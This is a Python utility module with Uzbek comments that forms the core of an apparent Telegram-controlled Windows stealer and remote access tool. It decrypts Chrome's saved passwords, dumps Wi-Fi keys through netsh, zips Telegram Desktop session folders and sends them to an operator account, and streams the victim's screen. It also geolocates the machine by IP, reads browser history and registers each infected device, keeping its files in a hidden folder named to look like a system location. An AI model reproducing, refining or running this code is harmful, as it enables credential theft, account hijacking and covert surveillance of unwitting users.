# utils.py - v3.1.0 FIXED CORE UTILITIES
"""
Tuzatilgan asosiy funksiyalar:
- 100% Async
- Xatolarsiz import
- Thread-safe operatsiyalar
- O'zbek tili
"""
import asyncio
import os
import sys
import json
import getpass
import shutil
import socket
import time
import sqlite3
import base64
import zipfile
import io
import ctypes
import logging
import urllib.request
import urllib.parse
from pathlib import Path
from PIL import ImageGrab
from concurrent.futures import ThreadPoolExecutor

# Optional imports with safe fallback
try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    pyautogui = None
    PYAUTOGUI_AVAILABLE = False

try:
    from Crypto.Cipher import AES
    PYCRYPTODOME_AVAILABLE = True
except ImportError:
    AES = None
    PYCRYPTODOME_AVAILABLE = False

from config import ADMIN_ID, MAX_FILE_SIZE, SCREENSHOT_QUALITY, LIVE_STREAM_FPS, CURRENT_VERSION

logger = logging.getLogger(__name__)

# Thread pool for CPU-bound operations
executor = ThreadPoolExecutor(max_workers=4)

# ==================== GLOBAL STATE ====================
selected_device = None
_live_active = False
_live_message_id = None

def get_selected_device():
    """Tanlangan qurilmani olish"""
    return selected_device

def set_selected_device(device):
    """Qurilmani tanlash"""
    global selected_device
    selected_device = device

# ==================== FILE PATHS ====================
def get_crypto_path(filename):
    """Yashirin papkada fayl yo'li"""
    base = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Crypto" / "system"
    base.mkdir(parents=True, exist_ok=True)
    return base / filename

DEVICES_FILE = get_crypto_path("net.dat")
SESSION_NAME = str(get_crypto_path("session"))
VERSION_FILE = get_crypto_path("version.txt")

def get_current_version():
    """Joriy versiyani olish - har doim config'dan"""
    # VERSION_FILE ni yangilash va CURRENT_VERSION qaytarish
    try:
        VERSION_FILE.write_text(CURRENT_VERSION)
    except:
        pass
    return CURRENT_VERSION

# ==================== DEVICE REGISTRATION ====================
async def register_device(client):
    """Qurilmani ro'yxatdan o'tkazish (Async)"""
    try:
        username = getpass.getuser()
        hostname = socket.gethostname()
        device_id = f"{username}@{hostname}"
        
        # Async DNS lookup
        loop = asyncio.get_event_loop()
        try:
            ip = await loop.run_in_executor(executor, socket.gethostbyname, hostname)
        except:
            ip = "Aniqlanmadi"

        # Read devices file
        devices = {}
        if DEVICES_FILE.exists():
            try:
                content = await loop.run_in_executor(executor, DEVICES_FILE.read_text, 'utf-8')
                devices = json.loads(content)
            except:
                devices = {}

        now = time.strftime("%Y-%m-%d %H:%M:%S")
        current_version = get_current_version()
        
        if device_id in devices:
            devices[device_id]["last_seen"] = now
            devices[device_id]["version"] = current_version
        else:
            devices[device_id] = {
                "first_seen": now,
                "last_seen": now,
                "ip": ip,
                "username": username,
                "hostname": hostname,
                "version": current_version
            }

        # Write to file
        content = json.dumps(devices, indent=2, ensure_ascii=False)
        await loop.run_in_executor(executor, DEVICES_FILE.write_text, content, 'utf-8')
        
        if ADMIN_ID:
            await client.send_message(
                ADMIN_ID, 
                f"🆕 **Yangi Qurilma**\n\n"
                f"🆔 `{device_id}`\n"
                f"🌐 IP: `{ip}`\n"
                f"👤 Foydalanuvchi: `{username}`\n"
                f"💻 Host: `{hostname}`\n"
                f"📦 Versiya: `{current_version}`"
            )
        logger.info(f"Qurilma ro'yxatga olindi: {device_id}")
        
    except Exception as e:
        logger.error(f"Qurilmani ro'yxatdan o'tkazish xatosi: {e}", exc_info=True)
        # Adminga xatolik haqida xabar
        try:
            await client.send_message(
                ADMIN_ID,
                f"⚠️ **Ro'yxatga olish xatosi**\n\n"
                f"Xato: `{str(e)}`"
            )
        except:
            pass

# ==================== LOCATION (100% ASYNC) ====================
async def fetch_url_async(url, timeout=10):
    """Async URL yuklash"""
    loop = asyncio.get_event_loop()
    try:
        def fetch():
            response = urllib.request.urlopen(url, timeout=timeout)
            return response.read().decode()
        
        data = await loop.run_in_executor(executor, fetch)
        return json.loads(data)
    except Exception as e:
        logger.error(f"URL yuklash xatosi {url}: {e}")
        return None

async def get_location_ipinfo():
    """IPinfo.io API - Async"""
    try:
        data = await fetch_url_async("https://ipinfo.io/json")
        if data and 'loc' in data:
            lat, lon = data['loc'].split(',')
            return {
                'success': True,
                'api': 'ipinfo.io',
                'ip': data.get('ip', 'Aniqlanmadi'),
                'city': data.get('city', 'Aniqlanmadi'),
                'region': data.get('region', 'Aniqlanmadi'),
                'country': data.get('country', 'Aniqlanmadi'),
                'lat': float(lat),
                'lon': float(lon),
                'postal': data.get('postal', 'Aniqlanmadi'),
                'timezone': data.get('timezone', 'Aniqlanmadi'),
                'org': data.get('org', 'Aniqlanmadi'),
            }
        return {'success': False, 'error': 'Joylashuv topilmadi'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def get_location_ipapi():
    """ip-api.com API - Async"""
    try:
        data = await fetch_url_async("http://ip-api.com/json/?fields=status,country,city,lat,lon,timezone,isp,org,query")
        if data and data.get('status') == 'success':
            return {
                'success': True,
                'api': 'ip-api.com',
                'ip': data.get('query', 'Aniqlanmadi'),
                'city': data.get('city', 'Aniqlanmadi'),
                'country': data.get('country', 'Aniqlanmadi'),
                'lat': float(data.get('lat', 0)),
                'lon': float(data.get('lon', 0)),
                'timezone': data.get('timezone', 'Aniqlanmadi'),
                'isp': data.get('isp', 'Aniqlanmadi'),
                'org': data.get('org', 'Aniqlanmadi'),
            }
        return {'success': False, 'error': 'API ishlamadi'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def get_location_from_ip():
    """Bir nechta API'larni parallel sinab ko'rish"""
    tasks = [
        get_location_ipinfo(),
        get_location_ipapi(),
    ]
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for result in results:
        if isinstance(result, dict) and result.get('success'):
            return result
    
    return {'success': False, 'error': 'Barcha API\'lar ishlamadi'}

async def send_live_location(client, chat_id):
    """Joylashuvni yuborish (Async)"""
    try:
        msg = await client.send_message(chat_id, "📍 **Joylashuv aniqlanmoqda...**")
        
        location = await get_location_from_ip()
        
        if location.get('success'):
            api = location.get('api', 'Aniqlanmadi')
            lat = location.get('lat', 0)
            lon = location.get('lon', 0)
            
            text = (
                f"📍 **Joylashuv Topildi!**\n\n"
                f"🔌 API: `{api}`\n"
                f"🌐 IP: `{location.get('ip')}`\n"
                f"🌍 Mamlakat: `{location.get('country')}`\n"
                f"🏙️ Shahar: `{location.get('city')}`\n"
                f"🕐 Vaqt mintaqasi: `{location.get('timezone')}`\n"
                f"📡 Provayider: `{location.get('isp')}`\n\n"
                f"📌 Kenglik: `{lat}` | Uzunlik: `{lon}`"
            )
            
            await client.edit_message(chat_id, msg.id, text)
            
            maps = f"https://www.google.com/maps?q={lat},{lon}"
            await client.send_message(chat_id, f"🗺️ **Google Xarita:**\n{maps}")
            
        else:
            await client.edit_message(chat_id, msg.id, f"❌ Xato: {location.get('error')}")
    except Exception as e:
        logger.error(f"Joylashuv xatosi: {e}")
        await client.send_message(chat_id, f"❌ Xato: {str(e)}")

# ==================== CHROME PASSWORDS (TUZATILGAN) ====================
def _get_chrome_secret_key():
    """Chrome maxfiy kalitini olish (Sync - executor'da ishlaydi)"""
    try:
        local_state = Path.home() / "AppData/Local/Google/Chrome/User Data/Local State"
        if not local_state.exists():
            return None
        
        with open(local_state, "r", encoding="utf-8") as f:
            data = json.load(f)
        
        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # 'DPAPI' prefiksini olib tashlash
        
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.c_ulong), ('pbData', ctypes.POINTER(ctypes.c_char))]
        
        buffer_in = ctypes.c_buffer(encrypted_key, len(encrypted_key))
        blob_in = DATA_BLOB(ctypes.c_ulong(len(encrypted_key)), ctypes.cast(buffer_in, ctypes.POINTER(ctypes.c_char)))
        blob_out = DATA_BLOB()
        
        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
            key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            return key
        return None
    except Exception as e:
        logger.error(f"Chrome kalit xatosi: {e}")
        return None

def _decrypt_chrome_password(password, key):
    """Parolni dekodlash (TUZATILGAN - xavfsiz import)"""
    try:
        if not key:
            return ""
        
        if password[:3] == b'v10' or password[:3] == b'v11':
            # TUZATILDI: pycryptodome mavjudligini tekshirish
            if not PYCRYPTODOME_AVAILABLE:
                return "[pycryptodome o'rnatilmagan - pip install pycryptodome]"
            
            try:
                iv = password[3:15]
                payload = password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt(payload)[:-16]
                return decrypted.decode('utf-8', errors='ignore')
            except Exception as decrypt_error:
                logger.error(f"AES dekodlash xatosi: {decrypt_error}")
                return "[Dekodlash xatosi]"
        else:
            # Eski DPAPI usuli
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [('cbData', ctypes.c_ulong), ('pbData', ctypes.POINTER(ctypes.c_char))]
            
            buffer_in = ctypes.c_buffer(password, len(password))
            blob_in = DATA_BLOB(ctypes.c_ulong(len(password)), ctypes.cast(buffer_in, ctypes.POINTER(ctypes.c_char)))
            blob_out = DATA_BLOB()
            
            if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                pwd = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                return pwd.decode('utf-8', errors='ignore')
            return ""
    except Exception as e:
        logger.error(f"Parolni dekodlash xatosi: {e}")
        return ""

def _extract_chrome_passwords_sync():
    """Chrome parollarini olish (Sync - executor'da ishlaydi)"""
    try:
        login_db = Path.home() / "AppData/Local/Google/Chrome/User Data/Default/Login Data"
        if not login_db.exists():
            return ["❌ Chrome topilmadi"]
        
        temp_db = Path(os.environ.get("TEMP", "")) / f"chrome_temp_{int(time.time())}.db"
        shutil.copyfile(login_db, temp_db)
        
        key = _get_chrome_secret_key()
        
        conn = sqlite3.connect(str(temp_db))
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        passwords = []
        for url, user, pwd_enc in cursor.fetchall():
            if user and pwd_enc:
                pwd = _decrypt_chrome_password(pwd_enc, key)
                if pwd and pwd.strip() and not pwd.startswith('['):
                    passwords.append(f"🌐 {url}\n👤 `{user}`\n🔑 `{pwd}`")
        
        conn.close()
        temp_db.unlink(missing_ok=True)
        
        if not passwords:
            return ["ℹ️ Parollar topilmadi"]
        
        if not PYCRYPTODOME_AVAILABLE:
            passwords.insert(0, "⚠️ DIQQAT: pycryptodome o'rnatilmagan!\nBa'zi parollar dekodlanmadi.\nO'rnatish: pip install pycryptodome\n")
        
        return passwords
    except Exception as e:
        logger.error(f"Chrome parollar xatosi: {e}")
        return [f"❌ Xato: {str(e)}"]

async def get_chrome_passwords():
    """Chrome parollarini olish (Async wrapper)"""
    loop = asyncio.get_event_loop()
    try:
        passwords = await loop.run_in_executor(executor, _extract_chrome_passwords_sync)
        return passwords
    except Exception as e:
        logger.error(f"Chrome async xatosi: {e}")
        return [f"❌ Xato: {str(e)}"]

# ==================== WI-FI PASSWORDS (ASYNC - TUZATILGAN) ====================
async def get_wifi_passwords():
    """Wi-Fi parollarini olish (Async) - Tildan mustaqil"""
    try:
        import subprocess
        import re
        
        proc = await asyncio.create_subprocess_exec(
            "netsh", "wlan", "show", "profiles",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
        )
        stdout, _ = await proc.communicate()
        
        # Turli encoding'larni sinab ko'rish
        for encoding in ['cp866', 'utf-8', 'cp1252', 'latin-1']:
            try:
                output = stdout.decode(encoding, errors='ignore')
                break
            except:
                output = stdout.decode('utf-8', errors='ignore')
        
        # TUZATILGAN: Tildan mustaqil profil nomi olish
        # Har qanday tilda ":" dan keyingi qiymatni olish
        profiles = []
        for line in output.splitlines():
            if ':' in line and ('Profile' in line or 'profil' in line.lower() or 'Пользовател' in line):
                parts = line.split(':', 1)
                if len(parts) == 2:
                    profile_name = parts[1].strip()
                    if profile_name and profile_name not in profiles:
                        profiles.append(profile_name)
        
        # Agar yuqoridagi usul ishlamasa, regex bilan sinash
        if not profiles:
            # Har qanday ":" dan keyin profil nomini olish
            pattern = r':\s*(.+)$'
            for line in output.splitlines():
                match = re.search(pattern, line)
                if match:
                    name = match.group(1).strip()
                    if name and len(name) > 1 and name not in profiles:
                        profiles.append(name)
        
        data = []
        for profile in profiles[:20]:  # Maksimum 20 ta
            try:
                proc2 = await asyncio.create_subprocess_exec(
                    "netsh", "wlan", "show", "profile", profile, "key=clear",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
                )
                stdout2, _ = await proc2.communicate()
                
                # Turli encoding'larni sinab ko'rish
                for encoding in ['cp866', 'utf-8', 'cp1252', 'latin-1']:
                    try:
                        details = stdout2.decode(encoding, errors='ignore')
                        break
                    except:
                        details = stdout2.decode('utf-8', errors='ignore')
                
                # TUZATILGAN: Tildan mustaqil parol olish
                # "Key Content", "Содержимое ключа", "Anahtar İçeriği" va boshqalar uchun
                key = None
                for line in details.splitlines():
                    line_lower = line.lower()
                    # Har qanday tilda "key" yoki "content" yoki kalit so'zlarini qidirish
                    if ':' in line and ('key' in line_lower or 'content' in line_lower or 
                                        'ключ' in line_lower or 'содержим' in line_lower or
                                        'anahtar' in line_lower or 'içerik' in line_lower):
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            potential_key = parts[1].strip()
                            if potential_key and len(potential_key) >= 8:  # Wi-Fi parol min 8 ta belgi
                                key = potential_key
                                break
                
                if key:
                    data.append(f"📡 **{profile}** → `{key}`")
            except:
                continue
        
        return "\n".join(data) if data else "ℹ️ Wi-Fi tarmoqlari topilmadi yoki parollar yo'q"
    except Exception as e:
        logger.error(f"Wi-Fi xatosi: {e}")
        return f"❌ Xato: {str(e)}"

# ==================== TELEGRAM TDATA (ASYNC & SAFE) ====================
def _create_zip_sync(source_dir, base_name):
    """ZIP arxiv yaratish (Sync - executor'da ishlaydi)"""
    try:
        zip_files = []
        part = 1
        
        file_list = []
        for root, _, files in os.walk(source_dir):
            for f in files:
                full_path = os.path.join(root, f)
                rel_path = os.path.relpath(full_path, source_dir)
                file_list.append((full_path, rel_path))
        
        if not file_list:
            return []
        
        current_zip = None
        current_size = 0
        
        for full_path, rel_path in file_list:
            try:
                file_size = os.path.getsize(full_path)
                
                if current_zip is None or current_size + file_size > MAX_FILE_SIZE:
                    if current_zip:
                        current_zip.close()
                        zip_files.append(current_zip.filename)
                    
                    zip_name = f"{base_name}_qism{part:02d}.zip"
                    current_zip = zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED)
                    current_size = 0
                    part += 1
                
                current_zip.write(full_path, rel_path)
                current_size += file_size
            except:
                continue
        
        if current_zip:
            current_zip.close()
            zip_files.append(current_zip.filename)
        
        return zip_files
    except Exception as e:
        logger.error(f"ZIP xatosi: {e}")
        return []

async def send_telegram_session(client, event):
    """Telegram sessiyasini yuborish (Async)"""
    try:
        msg = await client.send_message(event.chat_id, "🔍 **Qidirilmoqda...**")
        
        user = getpass.getuser()
        tdata_paths = []
        
        # Standart yo'llarni tekshirish
        standard = [
            (f"C:/Users/{user}/AppData/Roaming/Telegram Desktop/tdata", "Telegram"),
            (f"C:/Users/{user}/AppData/Roaming/AyuGram Desktop/tdata", "AyuGram"),
            (f"C:/Users/{user}/AppData/Roaming/Kotatogram Desktop/tdata", "Kotatogram"),
        ]
        
        for path_str, name in standard:
            path = Path(path_str)
            if path.exists() and (path / "key_datas").exists():
                tdata_paths.append((name, path))
        
        if not tdata_paths:
            await client.edit_message(event.chat_id, msg.id, "ℹ️ Telegram ma'lumotlari topilmadi")
            return
        
        await client.edit_message(event.chat_id, msg.id, f"✅ {len(tdata_paths)} ta topildi!\n📦 Arxivlanmoqda...")
        
        loop = asyncio.get_event_loop()
        all_zip_files = []
        
        for app_name, tdata_path in tdata_paths:
            base_name = app_name.lower().replace(" ", "_")
            # Og'ir ZIP operatsiyasini executor'da bajarish
            zip_files = await loop.run_in_executor(executor, _create_zip_sync, tdata_path, base_name)
            all_zip_files.extend(zip_files)
        
        if not all_zip_files:
            await client.edit_message(event.chat_id, msg.id, "❌ Arxivlash xatosi")
            return
        
        for idx, zip_file in enumerate(all_zip_files, 1):
            try:
                percent = (idx / len(all_zip_files)) * 100
                filled = int(percent / 5)
                bar = "▰" * filled + "▱" * (20 - filled)
                await client.edit_message(event.chat_id, msg.id, f"📤 {idx}/{len(all_zip_files)}\n[{bar}] {percent:.0f}%")
                
                await client.send_file(ADMIN_ID, zip_file, caption=f"📦 {os.path.basename(zip_file)}")
                
                # Telegram API'ga nafas berish
                await asyncio.sleep(1)
            finally:
                try:
                    os.remove(zip_file)
                except:
                    pass
        
        await client.edit_message(event.chat_id, msg.id, "✅ Yuborildi!")
    except Exception as e:
        logger.error(f"Telegram sessiya xatosi: {e}")
        await client.send_message(event.chat_id, f"❌ Xato: {str(e)}")

# ==================== NOTEPAD (ASYNC) ====================
async def open_notepad():
    """Notepad ochish (Async)"""
    try:
        proc = await asyncio.create_subprocess_exec("notepad.exe")
        return True
    except Exception as e:
        logger.error(f"Notepad ochish xatosi: {e}")
        return False

async def close_notepad():
    """Notepad yopish (Async)"""
    try:
        import subprocess
        proc = await asyncio.create_subprocess_exec(
            "taskkill", "/f", "/im", "notepad.exe",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await proc.communicate()
        return True
    except Exception as e:
        logger.error(f"Notepad yopish xatosi: {e}")
        return False

def write_in_notepad(text):
    """Notepad'ga yozish (Sync - pyautogui asosiy thread'da ishlaydi)"""
    if not PYAUTOGUI_AVAILABLE:
        logger.error("PyAutoGUI mavjud emas")
        return False
    try:
        pyautogui.write(text, interval=0.05)
        return True
    except Exception as e:
        logger.error(f"Yozish xatosi: {e}")
        return False

# ==================== LIVE STREAM (NON-BLOCKING) ====================
async def live_stream_improved(client, chat_id):
    """Jonli efir (To'liq async)"""
    global _live_active, _live_message_id
    if _live_active:
        return
    
    _live_active = True
    loop = asyncio.get_event_loop()
    
    try:
        msg = await client.send_message(chat_id, "🎥 **Jonli Efir Boshlandi**")
        _live_message_id = msg.id
        frame_count = 0
        
        while _live_active:
            try:
                # Screenshot'ni executor'da olish (CPU-bound)
                def capture():
                    screen = ImageGrab.grab()
                    bio = io.BytesIO()
                    if screen.mode in ("RGBA", "P"):
                        screen = screen.convert("RGB")
                    screen.save(bio, format='JPEG', quality=SCREENSHOT_QUALITY, optimize=True)
                    bio.seek(0)
                    bio.name = 'live.jpg'
                    return bio
                
                bio = await loop.run_in_executor(executor, capture)
                frame_count += 1
                
                await client.edit_message(chat_id, _live_message_id, f"🎥 Kadr #{frame_count}", file=bio)
            except:
                try:
                    msg = await client.send_file(chat_id, bio, caption=f"🎥 Kadr #{frame_count}")
                    _live_message_id = msg.id
                except:
                    break
            
            await asyncio.sleep(1 / LIVE_STREAM_FPS)
    except Exception as e:
        logger.error(f"Jonli efir xatosi: {e}")
    finally:
        _live_active = False

def stop_live_stream():
    """Jonli efirni to'xtatish"""
    global _live_active
    _live_active = False

# ==================== NIRCMD PATH ====================
def get_nircmd_path():
    """Nircmd.exe yo'lini olish (Sync - xavfsiz)"""
    if getattr(sys, 'frozen', False):
        return os.path.join(sys._MEIPASS, "nircmd.exe")
    else:
        return str(Path(__file__).parent / "nircmd.exe")

# ==================== BROWSER HISTORY (ASYNC) ====================
def _analyze_chrome_history_sync():
    """Chrome tarixini tahlil qilish (Sync - executor'da ishlaydi)"""
    try:
        chrome_history = Path.home() / "AppData/Local/Google/Chrome/User Data/Default/History"
        if not chrome_history.exists():
            return [{'error': 'Chrome tarixi topilmadi'}]
        
        temp_db = Path(os.environ.get("TEMP", "")) / f"temp_history_{int(time.time())}.db"
        shutil.copyfile(chrome_history, temp_db)
        
        conn = sqlite3.connect(str(temp_db))
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count FROM urls WHERE visit_count > 3 ORDER BY visit_count DESC LIMIT 25")
        
        most_visited = []
        for row in cursor.fetchall():
            url, title, count = row
            domain = url[:60]
            most_visited.append({'domain': domain, 'title': title[:60], 'visits': count})
        
        conn.close()
        temp_db.unlink(missing_ok=True)
        
        return most_visited if most_visited else [{'error': 'Topilmadi'}]
    except Exception as e:
        return [{'error': str(e)}]

async def analyze_most_visited():
    """Eng ko'p tashrif qilingan (Async wrapper)"""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(executor, _analyze_chrome_history_sync)

async def send_most_visited(client, chat_id):
    """Eng ko'p tashrif qilingan saytlarni yuborish"""
    try:
        msg = await client.send_message(chat_id, "📊 **Tahlil qilinmoqda...**")
        most_visited = await analyze_most_visited()
        
        if most_visited and 'error' not in most_visited[0]:
            text = "📊 **Eng Ko'p Tashrif Qilingan:**\n\n"
            for idx, item in enumerate(most_visited[:20], 1):
                text += f"{idx}. **{item['domain']}**\n   📄 {item['title']}\n   📈 {item['visits']} marta\n\n"
                if len(text) > 3500:
                    await client.send_message(chat_id, text)
                    text = ""
            if text:
                await client.edit_message(chat_id, msg.id, text)
        else:
            await client.edit_message(chat_id, msg.id, f"❌ {most_visited[0].get('error')}")
    except Exception as e:
        await client.send_message(chat_id, f"❌ Xato: {str(e)}")

# ==================== LOCATION HISTORY ====================
async def send_location_history(client, chat_id):
    """Joylashuv tarixi (Placeholder - kelajakda ishlab chiqish)"""
    await client.send_message(chat_id, "📜 **Joylashuv tarixi funksiyasi ishlab chiqilmoqda...**")

# ==================== LOCATION SERVICE ====================
async def enable_location_service():
    """Joylashuv xizmatini yoqish (Placeholder)"""
    return False

# ==================== EXPORT ====================
__all__ = [
    'register_device',
    'get_chrome_passwords',
    'get_wifi_passwords',
    'send_telegram_session',
    'send_live_location',
    'open_notepad',
    'close_notepad',
    'write_in_notepad',
    'live_stream_improved',
    'stop_live_stream',
    'get_nircmd_path',
    'send_most_visited',
    'send_location_history',
    'get_selected_device',
    'set_selected_device',
]